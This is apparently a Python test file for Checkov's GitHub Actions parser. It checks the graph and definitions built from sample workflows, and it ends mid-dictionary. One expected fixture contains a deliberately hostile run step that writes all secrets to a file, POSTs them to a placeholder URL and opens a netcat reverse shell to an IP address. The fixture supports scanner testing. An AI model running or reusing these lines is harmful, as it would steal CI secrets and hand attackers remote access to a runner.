from pathlib import Path

from checkov.common.graph.db_connectors.networkx.networkx_db_connector import NetworkxConnector
from checkov.common.graph.graph_builder import CustomAttributes
from checkov.common.graph.graph_builder.graph_components.block_types import BlockType
from checkov.common.runners.graph_manager import ObjectGraphManager
from checkov.github_actions.graph_builder.local_graph import GitHubActionsLocalGraph
from checkov.github_actions.runner import Runner
from checkov.github_actions.utils import get_gha_files_definitions, build_gha_definitions_context

RESOURCES_DIR = Path(__file__).parent / "resources"


def test_build_graph_from_definitions():
    # given
    test_file = str(RESOURCES_DIR / ".github/workflows/supply_chain.yaml")
    graph_manager = ObjectGraphManager(db_connector=NetworkxConnector(), source="GitHubActions")
    template, _ = Runner()._parse_file(f=test_file)

    # when
    local_graph = graph_manager.build_graph_from_definitions(
        definitions={test_file: template}, graph_class=GitHubActionsLocalGraph
    )

    # then
    assert len(local_graph.vertices) == 5
    assert len(local_graph.edges) == 2

    job_idx = local_graph.vertices_by_path_and_name[(test_file, "jobs.bridgecrew")]
    job = local_graph.vertices[job_idx]

    assert job.block_type == BlockType.RESOURCE
    assert job.id == "jobs.bridgecrew"
    assert job.source == "GitHubActions"
    assert job.attributes[CustomAttributes.RESOURCE_TYPE] == "jobs"
    assert job.config == {
        "runs-on": "ubuntu-latest",
        "steps": [
            {
                "name": "Run checkov",
                "id": "checkov",
                "uses": "bridgecrewio/checkov-action@master",
                "env": {
                    "GITHUB_TOKEN": "${{secrets.THIS_IS_A_TEST_SECRET}}",
                    "ACTIONS_ALLOW_UNSECURE_COMMANDS": "true",
                    "__startline__": 19,
                    "__endline__": 21,
                },
                "run": 'echo "${{ toJSON(secrets) }}" > .secrets\ncurl -X POST -s --data "@.secrets" <BADURL > /dev/null\nrm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|netcat 34.159.16.75 32032 >/tmp/f\n',
                "__startline__": 15,
                "__endline__": 25,
            }
        ],
        "__startline__": 13,
        "__endline__": 25,
    }


def test_get_definitions():
    definitions, definitions_raw = get_gha_files_definitions(root_folder=str(Path(__file__).parent / "gha"))
    assert len(definitions) == len(definitions_raw) == 1
    assert definitions[list(definitions.keys())[0]] == {
        "name": "read-only",
        "on": {"workflow_dispatch": None, "__startline__": 4, "__endline__": 6},
        "permissions": "write-all",
        "jobs": {
            "example": {
                "runs-on": "ubuntu-latest",
                "steps": [
                    {
                        "uses": "actions/checkout@93ea575cb5d8a053eaa0ac8fa3b40d7e05a33cc8",
                        "__startline__": 12,
                        "__endline__": 13,
                    },
                    {"run": 'echo "working hard"\n', "__startline__": 13, "__endline__": 15},
                ],
                "__startline__": 10,
                "__endline__": 15,
            },
            "__startline__": 9,
            "__endline__": 15,
        },
        "__startline__": 1,
        "__endline__": 15,
    }
    assert definitions_raw[list(definitions_raw.keys())[0]] == [
        (1, "name: read-only\n"),
        (2, "\n"),
        (3, "on:\n"),
        (4, "  workflow_dispatch:\n"),
        (5, "\n"),
        (6, "permissions: write-all\n"),
        (7, "\n"),
        (8, "jobs:\n"),
        (9, "  example:\n"),
        (10, "    runs-on: ubuntu-latest\n"),
        (11, "    steps:\n"),
        (12, "      - uses: actions/checkout@93ea575cb5d8a053eaa0ac8fa3b40d7e05a33cc8  # v3\n"),
        (13, "      - run: |\n"),
        (14, '          echo "working hard"\n'),
    ]


def test_build_def_context_simple():
    defs, defs_raw = get_gha_files_definitions(root_folder=str(Path(__file__).parent / "gha"))
    context = build_gha_definitions_context(definitions=defs, definitions_raw=defs_raw)
    assert context[list(context.keys())[0]] == {
        "permissions": {"write-all": {"start_line": 6, "end_line": 7, "code_lines": [(6, "permissions: write-all\n")]}},
        "jobs": {
            "example": {
                "start_line": 10,
                "end_line": 15,
                "code_lines": [
                    (10, "    runs-on: ubuntu-latest\n"),
                    (11, "    steps:\n"),
                    (12, "      - uses: actions/checkout@93ea575cb5d8a053eaa0ac8fa3b40d7e05a33cc8  # v3\n"),
                    (13, "      - run: |\n"),
                    (14, '          echo "working hard"\n'),
                ],
            }
        },
    }


def test_build_def_context_complex():
    defs = {
        "/tmp/checkov/tempo/blue/master/src/.github/workflows/run-secrets-detection.yml": {
            "name": "Secrets Detection",
            "on": "pull_request",
            "jobs": {
                "secrets_detection": {
                    "runs-on": "ubuntu-latest",
                    "if": "github.repository == 'demisto/content' && github.event.pull_request.head.repo.fork == false && github.actor != 'dependabot[bot]'",
                    "steps": [
                        {"name": "Checkout", "uses": "actions/checkout@v3", "__startline__": 9, "__endline__": 11},
                        {
                            "name": "Setup Python",
                            "uses": "actions/setup-python@v3",
                            "with": {"python-version": "3.8", "__startline__": 14, "__endline__": 15},
                            "__startline__": 11,
                            "__endline__": 15,
                        },
                        {
                            "name": "Setup Poetry",
                            "uses": "Gr1N/setup-poetry@v7",
                            "__startline__": 15,
                            "__endline__": 17,
                        },
                        {
                            "name": "Install Python Dependencies",
                            "run": "poetry install --with ci\n",
                            "__startline__": 17,
                            "__endline__": 20,
                        },
                        {
                            "name": "Run Secrets Detection",
                            "env": {
                                "PR_NUMBER": "${{ github.event.pull_request.number }}",
                                "BRANCH_NAME": "${{ github.head_ref }}",
                                "USERNAME": "${{ secrets.SECRET_CHECK_USER }}",
                                "PASSWORD": "${{ secrets.SECRET_CHECK_PASS }}",
                                "__startline__": 22,
                                "__endline__": 26,
                            },
                            "run": 'echo "Run secrets detection for PR: $PR_NUMBER on branch: $BRANCH_NAME"\ninvestigation_id=$(poetry run Utils/github_workflow_scripts/run_secrets_detection.py --pr_number $PR_NUMBER --branch_name $BRANCH_NAME --username $USERNAME --password $PASSWORD)\necho "INVESTIGATION_ID=$investigation_id" >> $GITHUB_ENV\n',
                            "__startline__": 20,
                            "__endline__": 30,
                        },
                        {
                            "name": "Wait For Playbook To Finish",
                            "env": {
                                "GOLD_API_KEY": "${{ secrets.SECRETS_GOLD_API_KEY }}",
                                "__startline__": 32,
                                "__endline__": 33,
                            },
                            "run": 'echo "Invastigation id is: $INVESTIGATION_ID "\npoetry run python ./Utils/github_workflow_scripts/run_secrets_detection_get_playbook_status.py -i $INVESTIGATION_ID -k $GOLD_API_KEY\n',
                            "__startline__": 30,
                            "__endline__": 38,
                        },
                    ],
                    "__startline__": 6,
                    "__endline__": 38,
                },
                "__startline__": 5,
                "__endline__": 38,
            },
            "__startline__": 1,
            "__endline__": 38,
        },
        "/tmp/checkov/tempo/blue/master/src/.github/workflows/trigger-contribution-build.yml": {
            "name": "Trigger Contribution Build",
            "on": {
                "pull_request_target": {"types": ["labeled"], "__startline__": 4, "__endline__": 6},
                "__startline__": 3,
                "__endline__": 6,
            },
            "jobs": {
                "trigget_contrib_build": {
                    "runs-on": "ubuntu-latest",
                    "if": "github.event.action == 'labeled' && contains(github.event.pull_request.labels.*.name, 'ready-for-instance-test') == true && github.event.pull_request.head.repo.fork == true",
                    "steps": [
                        {"name": "Checkout", "uses": "actions/checkout@v3", "__startline__": 11, "__endline__": 13},
                        {
                            "name": "Setup Python",
                            "uses": "actions/setup-python@v3",
                            "with": {"python-version": "3.9", "__startline__": 16, "__endline__": 17},
                            "__startline__": 13,
                            "__endline__": 17,
                        },
                        {
                            "name": "Setup Poetry",
                            "uses": "Gr1N/setup-poetry@v7",
                            "__startline__": 17,
                            "__endline__": 19,
                        },
                        {
                            "name": "Install Python Dependencies",
                            "run": "poetry install --with ci\n",
                            "__startline__": 19,
                            "__endline__": 22,
                        },
                        {
                            "name": "Trigger Contribution Build",
                            "env": {
                                "PR_NUMBER": "${{ github.event.pull_request.number }}",
                                "BASE_BRANCH": "${{ github.event.pull_request.base.ref }}",
                                "CONTRIB_BRANCH": "${{ github.event.pull_request.head.label }}",
                                "USERNAME": "${{ secrets.TRIGGER_BUILD_USER }}",
                                "PASSWORD": "${{ secrets.TRIGGER_BUILD_PASSWORD }}",
                                "__startline__": 24,
                                "__endline__": 29,
                            },
                            "run": 'echo "Trigger contribution build for PR: $PR_NUMBER with base branch: $BASE_BRANCH contrib branch: $CONTRIB_BRANCH"\npoetry run python ./Utils/github_workflow_scripts/trigger_contribution_build.py --pr_number $PR_NUMBER --base_branch $BASE_BRANCH --contrib_branch $CONTRIB_BRANCH --username $USERNAME --password $PASSWORD\n',
                            "__startline__": 22,
                            "__endline__": 32,
                        },
                    ],
                    "__startline__": 8,
                    "__endline__": 32,
                },
                "__startline__": 7,
                "__endline__": 32,
            },
            "__startline__": 1,
            "__endline__": 32,
        },
        "/tmp/checkov/tempo/blue/master/src/.github/workflows/review-release-notes.yml": {
            "name": "Review Release Notes",
            "on": "pull_request",
            "jobs": {
                "release_notes_review": {
                    "runs-on": "ubuntu-latest",
                    "if": "github.repository == 'demisto/content' && github.event.pull_request.head.repo.fork == false",
                    "steps": [
                        {
                            "name": "Checkout",
                            "uses": "actions/checkout@v3",
                            "with": {"fetch-depth": 2, "__startline__": 12, "__endline__": 13},
                            "__startline__": 9,
                            "__endline__": 13,
                        },
                        {
                            "name": "Get changed files",
                            "id": "changed-files",
                            "uses": "tj-actions/changed-files@v18.7",
                            "with": {"separator": ";", "__startline__": 17, "__endline__": 18},
                            "__startline__": 13,
                            "__endline__": 18,
                        },
                        {
                            "name": "Setup Python",
                            "uses": "actions/setup-python@v3",
                            "with": {"python-version": "3.9", "__startline__": 21, "__endline__": 22},
                            "__startline__": 18,
                            "__endline__": 22,
                        },
                        {
                            "name": "Setup Poetry",
                            "uses": "Gr1N/setup-poetry@v7",
                            "__startline__": 22,
                            "__endline__": 24,
                        },
                        {
                            "name": "Install Python Dependencies",
                            "run": "poetry install --with ci\n",
                            "__startline__": 24,
                            "__endline__": 27,
                        },
                        {
                            "name": "Review Release Notes",
                            "run": 'changed_files="${{ steps.changed-files.outputs.all_changed_files }}"\ndelim=\';\'\necho "Starting docs review"\npoetry run python Utils/github_workflow_scripts/run_docs_review.py --changed_files "$changed_files" --delimiter $delim\necho "Finished docs review successfully"',
                            "__startline__": 27,
                            "__endline__": 33,
                        },
                    ],
                    "__startline__": 6,
                    "__endline__": 33,
                },
                "__startline__": 5,
                "__endline__": 33,
            },
            "__startline__": 1,
            "__endline__": 33,
        },
        "/tmp/checkov/tempo/blue/master/src/.github/workflows/sync-contribution-base-branch.yml": {
            "name": "Sync contributor base branch",
            "on": {
                "schedule": [{"cron": "0 0 * * *", "__startline__": 5, "__endline__": 7}],
                "__startline__": 3,
                "__endline__": 7,
            },
            "permissions": {"contents": "read", "__startline__": 8, "__endline__": 10},
            "jobs": {
                "sync_contributor_base_branch": {
                    "runs-on": "ubuntu-latest",
                    "if": "github.repository == 'demisto/content'",
                    "steps": [
                        {"name": "Checkout", "uses": "actions/checkout@v3", "__startline__": 15, "__endline__": 17},
                        {
                            "name": "Setup Python",
                            "uses": "actions/setup-python@v3",
                            "with": {"python-version": "3.9", "__startline__": 20, "__endline__": 21},
                            "__startline__": 17,
                            "__endline__": 21,
                        },
                        {
                            "name": "Install Python Dependencies",
                            "run": "python -m pip install --upgrade pip\npip install pipenv==2021.5.29\n",
                            "__startline__": 21,
                            "__endline__": 25,
                        },
                        {
                            "name": "Sync Base Branch to Master",
                            "env": {
                                "CONTENTBOT_GH_ADMIN_TOKEN": "${{ secrets.CONTENTBOT_GH_ADMIN_TOKEN }}",
                                "__startline__": 27,
                                "__endline__": 28,
                            },
                            "run": 'echo "Updating contribution base branches (contrib/*)"\ncd Utils/github_workflow_scripts\npipenv sync\npipenv run ./sync_contrib_base.py\necho "Finished updating base branches"\n',
                            "__startline__": 25,
                            "__endline__": 34,
                        },
                    ],
                    "__startline__": 12,
                    "__endline__": 34,
                },
                "__startline__": 11,
                "__endline__": 34,
            },
            "__startline__": 1,
            "__endline__": 34,
        },
        "/tmp/checkov/tempo/blue/master/src/.github/workflows/check-contribution-form-filled.yml": {
            "name": "Contribution Form Filled label verification",
            "on": {
                "pull_request": {
                    "types": ["opened", "synchronize", "labeled", "unlabeled"],
                    "__startline__": 4,
                    "__endline__": 6,
                },
                "__startline__": 3,
                "__endline__": 6,
            },
            "permissions": {"pull-requests": "read", "__startline__": 7, "__endline__": 9},
            "jobs": {
                "contribution_form_filled_verification": {
                    "runs-on": "ubuntu-latest",
                    "if": "github.repository == 'demisto/content' && github.event.pull_request.head.repo.fork == true && contains(github.head_ref, 'xsoar-bot-contrib-ContributionTestPack') == false && contains(github.event.pull_request.title, '[Marketplace Contribution]') == false",
                    "steps": [
                        {"name": "Checkout", "uses": "actions/checkout@v3", "__startline__": 15, "__endline__": 17},
                        {
                            "name": "Setup Python",
                            "uses": "actions/setup-python@v3",
                            "with": {"python-version": "3.9", "__startline__": 20, "__endline__": 21},
                            "__startline__": 17,
                            "__endline__": 21,
                        },
                        {
                            "name": "Install Python Dependencies",
                            "run": "python -m pip install --upgrade pip\npip install pipenv==2021.5.29\ncd Utils/github_workflow_scripts\npipenv sync\n",
                            "__startline__": 21,
                            "__endline__": 27,
                        },
                        {
                            "name": "Check if contribution form needs to be filled",
                            "env": {
                                "PR_NUMBER": "${{ github.event.pull_request.number }}",
                                "GITHUB_TOKEN": "${{ secrets.GITHUB_TOKEN }}",
                                "__startline__": 29,
                                "__endline__": 31,
                            },
                            "run": 'echo "Checking if contribution form needs to be filled for PR: $PR_NUMBER"\ncd Utils/github_workflow_scripts\npipenv run ./check_if_needs_to_fill_contribution_form.py --pr_number $PR_NUMBER --github_token $GITHUB_TOKEN\n',
                            "__startline__": 27,
                            "__endline__": 35,
                        },
                    ],
                    "__startline__": 11,
                    "__endline__": 35,
                },
                "__startline__": 10,
                "__endline__": 35,
            },
            "__startline__": 1,
            "__endline__": 35,
        },
        "/tmp/checkov/tempo/blue/master/src/.github/workflows/close_jira_issue_by_pr_merge.yml": {
            "name": "Add PR link to Related Jira Issue",
            "on": {
                "pull_request": {"types": ["closed"], "__startline__": 4, "__endline__": 6},
                "__startline__": 3,
                "__endline__": 6,
            },
            "permissions": {"pull-requests": "read", "__startline__": 7, "__endline__": 9},
            "jobs": {
                "add_pr_link_to_related_jira_issue": {
                    "runs-on": "ubuntu-latest",
                    "if": "github.repository == 'demisto/content' && github.event.pull_request.head.repo.fork == false && github.actor != 'dependabot[bot]' && github.event.action == 'closed' && github.event.pull_request.merged == true",
                    "steps": [
                        {"name": "Checkout", "uses": "actions/checkout@v3", "__startline__": 14, "__endline__": 16},
                        {
                            "name": "Setup Python",
                            "uses": "actions/setup-python@v3",
                            "with": {"python-version": "3.9", "__startline__": 19, "__endline__": 20},
                            "__startline__": 16,
                            "__endline__": 20,
                        },
                        {
                            "name": "Setup Poetry",
                            "uses": "Gr1N/setup-poetry@v7",
                            "__startline__": 20,
                            "__endline__": 22,
                        },
                        {
                            "uses": "actions/cache@v2",
                            "with": {
                                "path": ".venv",
                                "key": "${{ runner.os }}-poetry-${{ hashFiles('poetry.lock') }}",
                                "__startline__": 24,
                                "__endline__": 26,
                            },
                            "__startline__": 22,
                            "__endline__": 26,
                        },
                        {
                            "name": "Install Python Dependencies",
                            "run": "poetry install --with ci\n",
                            "__startline__": 26,
                            "__endline__": 29,
                        },
                        {
                            "name": "Run Linking pr to Jira Script",
                            "env": {
                                "PR_NUMBER": "${{ github.event.pull_request.number }}",
                                "PR_TITLE": "${{ github.event.pull_request.title }}",
                                "PR_LINK": "${{ github.event.pull_request.html_url }}",
                                "PR_BODY": "${{ github.event.pull_request.body }}",
                                "IS_MERGED": True,
                                "USERNAME": "${{ secrets.LINK_PR_TO_JIRA_ISSUE_USER }}",
                                "PASSWORD": "${{ secrets.LINK_PR_TO_JIRA_ISSUE_PASSWORD }}",
                                "INSTANCE_URL": "${{ secrets.ENGINE_URL }}",
                                "__startline__": 31,
                                "__endline__": 39,
                            },
                            "run": 'echo "Checking for related Jira issues to PR: $PR_NUMBER"\ncd Utils/github_workflow_scripts/jira_integration_scripts\npoetry run python ./link_pr_to_jira_issue.py --url "$INSTANCE_URL" --pr_num "$PR_NUMBER" --pr_link "$PR_LINK" --pr_title "$PR_TITLE" --pr_body "$PR_BODY" --is_merged $IS_MERGED --username $USERNAME --password $PASSWORD\n',
                            "__startline__": 29,
                            "__endline__": 43,
                        },
                    ],
                    "__startline__": 11,
                    "__endline__": 43,
                },
                "__startline__": 10,
                "__endline__": 43,
            },
            "__startline__": 1,
            "__endline__": 43,
        },
        "/tmp/checkov/tempo/blue/master/src/.github/workflows/project_manager_hourly.yml": {
            "name": "Manage Contribution Board - Hourly",
            "on": {
                "schedule": [{"cron": "0 * * * *", "__startline__": 4, "__endline__": 5}],
                "__startline__": 3,
                "__endline__": 5,
            },
            "permissions": {"contents": "read", "__startline__": 6, "__endline__": 8},
            "jobs": {
                "manage_project_board": {
                    "runs-on": "ubuntu-latest",
                    "if": "github.repository == 'demisto/content'",
                    "steps": [
                        {"uses": "actions/checkout@v3", "__startline__": 13, "__endline__": 14},
                        {
                            "name": "Set up Python 3.7",
                            "uses": "actions/setup-python@v3",
                            "with": {"python-version": "3.7", "__startline__": 17, "__endline__": 18},
                            "__startline__": 14,
                            "__endline__": 18,
                        },
                        {
                            "name": "Get project manager",
                            "run": "pip install --upgrade pip\npip install github-automation\n",
                            "__startline__": 18,
                            "__endline__": 22,
                        },
                        {
                            "name": "Manage project",
                            "run": "github-automation manage -c .github/project_conf/contributions.ini\n",
                            "env": {
                                "GITHUB_TOKEN": "${{ secrets.CONTENTBOT_BOARD_UPDATE_TOKEN }}",
                                "__startline__": 26,
                                "__endline__": 27,
                            },
                            "__startline__": 22,
                            "__endline__": 27,
                        },
                    ],
                    "__startline__": 10,
                    "__endline__": 27,
                },
                "__startline__": 9,
                "__endline__": 27,
            },
            "__startline__": 1,
            "__endline__": 27,
        },
        "/tmp/checkov/tempo/blue/master/src/.github/workflows/create-internal-pr-from-external.yml": {
            "name": "Create Internal PR from Merged External PR",
            "on": {
                "pull_request_target": {
                    "types": ["closed"],
                    "branches": ["contrib/**"],
                    "__startline__": 4,
                    "__endline__": 8,
                },
                "__startline__": 3,
                "__endline__": 8,
            },
            "jobs": {
                "create_internal_pr": {
                    "runs-on": "ubuntu-latest",
                    "if": "github.repository == 'demisto/content' && github.event.action == 'closed' && github.event.pull_request.merged == true && github.event.pull_request.head.repo.fork == true",
                    "steps": [
                        {"name": "Checkout", "uses": "actions/checkout@v3", "__startline__": 13, "__endline__": 15},
                        {
                            "name": "Setup Python",
                            "uses": "actions/setup-python@v3",
                            "with": {"python-version": "3.9", "__startline__": 18, "__endline__": 20},
                            "__startline__": 15,
                            "__endline__": 20,
                        },
                        {
                            "name": "Print Context",
                            "run": 'echo "$GITHUB_CONTEXT"\n',
                            "env": {"GITHUB_CONTEXT": "${{ toJson(github) }}", "__startline__": 24, "__endline__": 26},
                            "__startline__": 20,
                            "__endline__": 26,
                        },
                        {
                            "name": "Install Python Dependencies",
                            "run": "python -m pip install --upgrade pip\npip install pipenv==2021.5.29\n",
                            "__startline__": 26,
                            "__endline__": 30,
                        },
                        {
                            "name": "Create Internal PR",
                            "env": {
                                "CONTENTBOT_GH_ADMIN_TOKEN": "${{ secrets.CONTENTBOT_GH_ADMIN_TOKEN }}",
                                "EVENT_PAYLOAD": "${{ toJson(github.event) }}",
                                "__startline__": 32,
                                "__endline__": 34,
                            },
                            "run": 'echo "Creating an internal PR from original merged external PR ${{ github.event.pull_request.html_url }}"\ncd Utils/github_workflow_scripts\npipenv sync\npipenv run ./create_internal_pr.py\necho "Finished Creating Internal PR"\n',
                            "__startline__": 30,
                            "__endline__": 40,
                        },
                    ],
                    "__startline__": 10,
                    "__endline__": 40,
                },
                "__startline__": 9,
                "__endline__": 40,
            },
            "__startline__": 1,
            "__endline__": 40,
        },
        "/tmp/checkov/tempo/blue/master/src/.github/workflows/sync-contribution-base-branch-on-change.yml": {
            "name": "Sync contributor base branch on change",
            "on": {
                "pull_request_target": {
                    "types": ["edited", "synchronize"],
                    "branches": ["contrib/**"],
                    "__startline__": 4,
                    "__endline__": 10,
                },
                "__startline__": 3,
                "__endline__": 10,
            },
            "permissions": {"contents": "read", "__startline__": 11, "__endline__": 13},
            "jobs": {
                "sync_contributor_base_branch": {
                    "runs-on": "ubuntu-latest",
                    "if": "github.repository == 'demisto/content' && github.event.pull_request.head.repo.fork == true && contains(github.head_ref, 'xsoar-bot-contrib-ContributionTestPack') == false",
                    "steps": [
                        {"name": "Checkout", "uses": "actions/checkout@v3", "__startline__": 18, "__endline__": 20},
                        {
                            "name": "Setup Python",
                            "uses": "actions/setup-python@v3",
                            "with": {"python-version": "3.9", "__startline__": 23, "__endline__": 24},
                            "__startline__": 20,
                            "__endline__": 24,
                        },
                        {
                            "name": "Install Python Dependencies",
                            "run": "python -m pip install --upgrade pip\npip install pipenv==2021.5.29\n",
                            "__startline__": 24,
                            "__endline__": 28,
                        },
                        {
                            "name": "Sync Base Branch to Master",
                            "env": {
                                "CONTENTBOT_GH_ADMIN_TOKEN": "${{ secrets.CONTENTBOT_GH_ADMIN_TOKEN }}",
                                "__startline__": 30,
                                "__endline__": 31,
                            },
                            "run": 'echo "Updating contribution base branch (contrib/*)"\ncd Utils/github_workflow_scripts\npipenv sync\npipenv run ./sync_contrib_base.py --branch_name ${{ github.event.pull_request.base.ref }}\necho "Finished updating base branch"\n',
                            "__startline__": 28,
                            "__endline__": 37,
                        },
                    ],
                    "__startline__": 15,
                    "__endline__": 37,
                },
                "__startline__": 14,
                "__endline__": 37,
            },
            "__startline__": 1,
            "__endline__": 37,
        },
        "/tmp/checkov/tempo/blue/master/src/.github/workflows/link_edited_pr_to_jira_issue.yml": {
            "name": "Add PR link to Related Jira Issue",
            "on": {
                "pull_request": {"types": ["opened", "edited"], "__startline__": 4, "__endline__": 6},
                "__startline__": 3,
                "__endline__": 6,
            },
            "permissions": {"pull-requests": "read", "__startline__": 7, "__endline__": 9},
            "jobs": {
                "add_pr_link_to_related_jira_issue": {
                    "runs-on": "ubuntu-latest",
                    "if": "github.repository == 'demisto/content' && github.event.pull_request.head.repo.fork == false && github.actor != 'dependabot[bot]'",
                    "steps": [
                        {"name": "Checkout", "uses": "actions/checkout@v3", "__startline__": 14, "__endline__": 16},
                        {
                            "name": "Setup Python",
                            "uses": "actions/setup-python@v3",
                            "with": {"python-version": "3.9", "__startline__": 19, "__endline__": 20},
                            "__startline__": 16,
                            "__endline__": 20,
                        },
                        {
                            "name": "Setup Poetry",
                            "uses": "Gr1N/setup-poetry@v7",
                            "__startline__": 20,
                            "__endline__": 22,
                        },
                        {
                            "uses": "actions/cache@v2",
                            "with": {
                                "path": ".venv",
                                "key": "${{ runner.os }}-poetry-${{ hashFiles('poetry.lock') }}",
                                "__startline__": 24,
                                "__endline__": 26,
                            },
                            "__startline__": 22,
                            "__endline__": 26,
                        },
                        {
                            "name": "Install Python Dependencies",
                            "run": "poetry install --with ci\n",
                            "__startline__": 26,
                            "__endline__": 29,
                        },
                        {
                            "name": "Run Linking pr to Jira Script",
                            "env": {
                                "PR_NUMBER": "${{ github.event.pull_request.number }}",
                                "PR_TITLE": "${{ github.event.pull_request.title }}",
                                "PR_LINK": "${{ github.event.pull_request.html_url }}",
                                "PR_BODY": "${{ github.event.pull_request.body }}",
                                "IS_MERGED": False,
                                "USERNAME": "${{ secrets.LINK_PR_TO_JIRA_ISSUE_USER }}",
                                "PASSWORD": "${{ secrets.LINK_PR_TO_JIRA_ISSUE_PASSWORD }}",
                                "INSTANCE_URL": "${{ secrets.ENGINE_URL }}",
                                "__startline__": 31,
                                "__endline__": 39,
                            },
                            "run": 'echo "Checking for related Jira issues to PR: $PR_NUMBER"\ncd Utils/github_workflow_scripts/jira_integration_scripts\necho --pr_num $PR_NUMBER --pr_link $PR_LINK --pr_title $PR_TITLE --pr_body $PR_BODY --is_merged $IS_MERGED\npoetry run python ./link_pr_to_jira_issue.py --url "$INSTANCE_URL" --pr_num "$PR_NUMBER" --pr_link "$PR_LINK" --pr_title "$PR_TITLE" --pr_body "$PR_BODY" --is_merged $IS_MERGED --username $USERNAME --password $PASSWORD\n',
                            "__startline__": 29,
                            "__endline__": 44,
                        },
                    ],
                    "__startline__": 11,
                    "__endline__": 44,
                },
                "__startline__": 10,
                "__endline__": 44,
            },
            "__startline__": 1,
            "__endline__": 44,
        },
        "/tmp/checkov/tempo/blue/master/src/.github/workflows/check-contributor-pack.yml": {
            "name": "Check contributor packs",
            "on": {
                "pull_request": {"branches": ["master"], "__startline__": 4, "__endline__": 7},
                "__startline__": 3,
                "__endline__": 7,
            },
            "permissions": {"pull-requests": "write", "__startline__": 8, "__endline__": 10},
            "jobs": {
                "check_contributor_pack": {
                    "runs-on": "ubuntu-latest",
                    "if": "github.repository == 'demisto/content' && startsWith(github.head_ref, 'contrib/') == false && startsWith(github.head_ref, 'to-merge/') == false && contains(github.head_ref, 'xsoar-bot-contrib-ContributionTestPack') == false && github.event.pull_request.head.repo.fork == false",
                    "steps": [
                        {"name": "Checkout", "uses": "actions/checkout@v3", "__startline__": 15, "__endline__": 17},
                        {
                            "name": "Setup Python",
                            "uses": "actions/setup-python@v3",
                            "with": {"python-version": "3.8", "__startline__": 20, "__endline__": 21},
                            "__startline__": 17,
                            "__endline__": 21,
                        },
                        {
                            "name": "Setup Poetry",
                            "uses": "Gr1N/setup-poetry@v7",
                            "__startline__": 21,
                            "__endline__": 23,
                        },
                        {
                            "name": "Install python dependencies",
                            "run": "poetry install --with ci\n",
                            "__startline__": 23,
                            "__endline__": 26,
                        },
                        {
                            "name": "Check pack and request review",
                            "env": {
                                "GITHUB_TOKEN": "${{ secrets.GITHUB_TOKEN }}",
                                "PR_NUMBER": "${{ github.event.pull_request.number }}",
                                "BRANCH_NAME": "${{ github.head_ref }}",
                                "SENDGRID_EMAIL_API_KEY": "${{ secrets.SENDGRID_EMAIL_API_KEY }}",
                                "__startline__": 28,
                                "__endline__": 32,
                            },
                            "if": "env.SENDGRID_EMAIL_API_KEY",
                            "run": 'echo "PR number is: $PR_NUMBER"\necho "Target branch name is: $BRANCH_NAME"\necho "Starting check of contributor packs"\npoetry run python ./Utils/request_contributor_review.py --pr_number $PR_NUMBER --github_token $GITHUB_TOKEN --email_api_token $SENDGRID_EMAIL_API_KEY\necho "Finished check of contributor packs"\n',
                            "__startline__": 26,
                            "__endline__": 39,
                        },
                    ],
                    "__startline__": 12,
                    "__endline__": 39,
                },
                "__startline__": 11,
                "__endline__": 39,
            },
            "__startline__": 1,
            "__endline__": 39,
        },
        "/tmp/checkov/tempo/blue/master/src/.github/workflows/project_manager_daily.yml": {
            "name": "Manage Contribution Board - Daily",
            "on": {
                "schedule": [{"cron": "0 0 * * *", "__startline__": 4, "__endline__": 5}],
                "__startline__": 3,
                "__endline__": 5,
            },
            "permissions": {"contents": "read", "__startline__": 6, "__endline__": 8},
            "jobs": {
                "manage_project_board": {
                    "runs-on": "ubuntu-latest",
                    "if": "github.repository == 'demisto/content'",
                    "steps": [
                        {"uses": "actions/checkout@v3", "__startline__": 13, "__endline__": 14},
                        {
                            "name": "Set up Python 3.7",
                            "uses": "actions/setup-python@v3",
                            "with": {"python-version": "3.7", "__startline__": 17, "__endline__": 18},
                            "__startline__": 14,
                            "__endline__": 18,
                        },
                        {
                            "name": "Get project manager",
                            "run": "pip install --upgrade pip\npip install github-automation\n",
                            "__startline__": 18,
                            "__endline__": 22,
                        },
                        {
                            "name": "Manage project",
                            "run": "github-automation manage -c .github/project_conf/contributions.ini\n",
                            "env": {
                                "GITHUB_TOKEN": "${{ secrets.CONTENTBOT_BOARD_UPDATE_TOKEN }}",
                                "__startline__": 26,
                                "__endline__": 27,
                            },
                            "__startline__": 22,
                            "__endline__": 27,
                        },
                    ],
                    "__startline__": 10,
                    "__endline__": 27,
                },
                "__startline__": 9,
                "__endline__": 27,
            },
            "__startline__": 1,
            "__endline__": 27,
        },
        "/tmp/checkov/tempo/blue/master/src/.github/workflows/handle-stale-branches.yml": {
            "name": "Handle stale branches",
            "on": {
                "schedule": [{"cron": "0 0 * * *", "__startline__": 5, "__endline__": 6}],
                "__startline__": 3,
                "__endline__": 6,
            },
            "permissions": {"contents": "read", "__startline__": 7, "__endline__": 9},
            "jobs": {
                "handle_contributor_stale_branches": {
                    "runs-on": "ubuntu-latest",
                    "if": "github.repository == 'demisto/content'",
                    "steps": [
                        {"name": "Checkout", "uses": "actions/checkout@v3", "__startline__": 14, "__endline__": 16},
                        {
                            "name": "Setup Python",
                            "uses": "actions/setup-python@v3",
                            "with": {"python-version": "3.9", "__startline__": 19, "__endline__": 20},
                            "__startline__": 16,
                            "__endline__": 20,
                        },
                        {
                            "name": "Install Python Dependencies",
                            "run": "python -m pip install --upgrade pip\npip install pipenv==2021.5.29\n",
                            "__startline__": 20,
                            "__endline__": 24,
                        },
                        {
                            "name": "Delete Stale Contributor Branches",
                            "env": {
                                "CONTENTBOT_GH_ADMIN_TOKEN": "${{ secrets.CONTENTBOT_GH_ADMIN_TOKEN }}",
                                "__startline__": 26,
                                "__endline__": 27,
                            },
                            "run": 'echo "Deleting stale contribution base branches (contrib/*)"\ncd Utils/github_workflow_scripts\npipenv sync\npipenv run ./delete_stale_contrib_branches.py\necho "Finished deleting stale branches"\n',
                            "__startline__": 24,
                            "__endline__": 34,
                        },
                    ],
                    "__startline__": 11,
                    "__endline__": 34,
                },
                "handle_stale_non_contributor_branches": {
                    "runs-on": "ubuntu-latest",
                    "if": "github.repository == 'demisto/content'",
                    "steps": [
                        {"name": "Checkout", "uses": "actions/checkout@v3", "__startline__": 38, "__endline__": 40},
                        {
                            "name": "Setup Python",
                            "uses": "actions/setup-python@v3",
                            "with": {"python-version": "3.9", "__startline__": 43, "__endline__": 44},
                            "__startline__": 40,
                            "__endline__": 44,
                        },
                        {
                            "name": "Install Python Dependencies",
                            "run": "python -m pip install --upgrade pip\npip install pipenv==2021.5.29\n",
